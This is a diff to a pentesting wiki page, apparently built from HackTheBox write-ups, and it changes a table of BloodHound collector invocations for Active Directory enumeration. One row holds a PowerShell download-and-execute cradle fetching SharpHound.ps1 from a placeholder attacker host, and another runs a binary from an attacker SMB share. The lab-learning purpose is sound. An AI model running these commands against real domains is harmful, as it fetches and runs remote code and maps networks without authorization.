@@ -299,7 +299,7 @@ Twenty-plus Windows boxes in `raw/research/0xdf-htb/` are tagged `bloodhound` or
 
 | Situation | Collector | Typical invocation |
 |-----------|-----------|---------------------|
-| PowerShell foothold ([[evil-winrm]], WinRM PS) | `SharpHound.ps1` / `invoke-bloodhound` | `iex(New-Object Net.WebClient).DownloadString('http://ATTACKER/SharpHound.ps1')` then `Invoke-BloodHound -CollectionMethod All -Domain CORP.LOCAL -LDAPUser svc -LDAPPass pass` (HTB Forest-style) |
+| PowerShell foothold ([[wiki/tools/evil-winrm]], WinRM PS) | `SharpHound.ps1` / `invoke-bloodhound` | `iex(New-Object Net.WebClient).DownloadString('http://ATTACKER/SharpHound.ps1')` then `Invoke-BloodHound -CollectionMethod All -Domain CORP.LOCAL -LDAPUser svc -LDAPPass pass` (HTB Forest-style) |
 | Same, binary from SMB share | `SharpHound.exe` | Run from UNC path so output lands on attacker share (`\\ATTACKER\share\SharpHound.exe`). Default zip name `*_BloodHound.zip` (HTB Sauna, MultiMaster). |
 | Creds only, Linux attacker | BloodHound.py (`bloodhound-python`) | `bloodhound-python -c ALL -u user -p pass -d domain.local -dc dc01.domain.local -ns 10.10.10.x` DNS server `-ns` must resolve the `-dc` hostname (HTB Blackfield, Intelligence, Search, Pivotapi, Support). Narrow collection if timeouts: `-c Group,LocalAdmin,RDP,DCOM,Container,PSRemote,Session,Acl,Trusts,LoggedOn` (HTB Rebound). Kerberos LDAP: `-k` with synced clock. Output: `*.json` or `--zip`. |
 | Creds via [[netexec]] | Module `--bloodhound` | `netexec ldap DC -u user -p pass --bloodhound -c All --dns-server DC_IP` creates a zip under `~/.nxc/logs/` (VulnLab Delegate-style). |
